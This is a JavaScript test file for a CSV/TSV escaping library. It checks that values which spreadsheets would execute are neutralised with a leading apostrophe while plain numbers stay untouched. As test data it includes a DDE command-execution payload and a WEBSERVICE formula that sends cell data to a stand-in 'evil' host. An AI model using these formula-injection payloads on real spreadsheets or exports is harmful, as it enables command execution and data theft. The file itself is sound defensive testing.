/*
  tests/csv.test.mjs
  --------------------------------------------------------------------------
  CSV and TSV escaping — lib/csv.js.

  The rule under test is that a value which a spreadsheet would EXECUTE must
  leave the app as text. Quoting is not the fix (Excel evaluates a quoted cell
  beginning `=` identically), so the assertions below check for the leading
  apostrophe specifically rather than for "some escaping happened".
  -------------------------------------------------------------------------- */

import { csvCell, tsvCell, isFormulaLead } from '../lib/csv.js'

let pass = 0, fail = 0
const ok = (c, m) => { if (c) { pass++; console.log('  ok   ' + m) } else { fail++; console.log('  FAIL ' + m) } }
const eq = (a, b, m) => ok(a === b, `${m}  (got ${JSON.stringify(a)})`)

console.log('\n  csvCell — formula leads')
{
  eq(csvCell('=1+1'), `"'=1+1"`, 'a leading = is neutralised and quoted')
  eq(csvCell('+1'), '+1', 'a leading + on a NUMBER is left alone')
  eq(csvCell('-1'), '-1', 'a leading - on a NUMBER is left alone')
  eq(csvCell('@SUM(A1)'), `"'@SUM(A1)"`, 'a leading @')
  eq(csvCell('\t=1'), `"'\t=1"`, 'a leading tab, because whitespace is stripped before the lead is judged')
  eq(csvCell('\r=1'), `"'\r=1"`, 'a leading carriage return')
  // The two payloads from the audit, exactly as written.
  ok(csvCell(`=cmd|'/c calc'!A1`).startsWith(`"'=`), 'the DDE command-execution payload is neutralised')
  ok(csvCell('=WEBSERVICE("http://evil/"&A1)').startsWith(`"'=`), 'the exfiltration payload is neutralised')
}

console.log('\n  csvCell — ordinary values are left alone')
{
  eq(csvCell('hello'), 'hello', 'plain text is untouched')
  eq(csvCell(''), '', 'empty stays empty')
  eq(csvCell(null), '', 'null renders as empty, not "null"')
  eq(csvCell(undefined), '', 'undefined renders as empty')
  eq(csvCell(0), '0', 'zero survives — the falsy trap')
  eq(csvCell(false), 'false', 'false survives')
  eq(csvCell('a-b'), 'a-b', 'a hyphen mid-value is not a formula lead')
  eq(csvCell('3 + 4'), '3 + 4', 'a + mid-value is not a formula lead')
  eq(csvCell('-5'), '-5', 'a negative NUMBER is NOT escaped — mangling every negative in a data tool is worse than the risk')
  eq(csvCell('+3.5'), '+3.5', 'a signed decimal is a number')
  eq(csvCell('-1.5e3'), '-1.5e3', 'scientific notation is a number')
  eq(csvCell('-1+1'), `"'-1+1"`, 'but an EXPRESSION starting with - is escaped')
  ok(csvCell("+cmd|'/c calc'!A0").startsWith(`"'+`), 'and so is the + form of the DDE payload')
  ok(isFormulaLead('-5') === false, 'isFormulaLead exempts plain numbers')
  ok(isFormulaLead('-1+1') === true, 'isFormulaLead catches expressions')
  ok(isFormulaLead('') === false, 'an empty value is not a formula')
}

console.log('\n  csvCell — quoting')
{
  eq(csvCell('a,b'), '"a,b"', 'a comma forces quotes')
  eq(csvCell('say "hi"'), '"say ""hi"""', 'quotes are doubled')
  eq(csvCell('two\nlines'), '"two\nlines"', 'a newline forces quotes')
  eq(csvCell('two\rlines'), '"two\rlines"', 'a bare CR forces quotes — this was missing and broke row structure')
}

console.log('\n  tsvCell — clipboard')
{
  eq(tsvCell('=1+1'), `'=1+1`, 'formulas are neutralised on copy too, because the paste target is Excel')
  eq(tsvCell('a\tb'), 'a b', 'an embedded tab becomes a space rather than a new column')
  eq(tsvCell('a\nb'), 'a b', 'an embedded newline becomes a space rather than a new row')
  eq(tsvCell('a\r\nb'), 'a b', 'CRLF collapses to a single space')
  eq(tsvCell('plain'), 'plain', 'plain text is untouched')
  eq(tsvCell(null), '', 'null is empty')
}

console.log('\n  round trip')
{
  /* The original text must survive intact underneath the escape.

     Note what this does NOT claim: that the apostrophe is invisible. Sheets
     and LibreOffice treat a leading ' in an imported field as a text marker
     and hide it; Excel shows it. That visible apostrophe is the real cost of
     this defence, and it is why the plain-number exemption in lib/csv.js
     matters so much — without it every negative number in every export would
     pay it. */
  const raw = '=SUM(A1:A9)'
  const out = csvCell(raw)
  ok(out.startsWith(`"'`) && out.endsWith('"'), 'an escaped value is force-quoted')
  eq(out.slice(2, -1), raw, 'the original text is intact underneath the escape')
  eq(csvCell('="a"'), `"'=""a"""`, 'quotes inside an escaped value are still doubled')
}

console.log(`\n ${pass} passed, ${fail} failed\n`)
process.exit(fail ? 1 : 0)
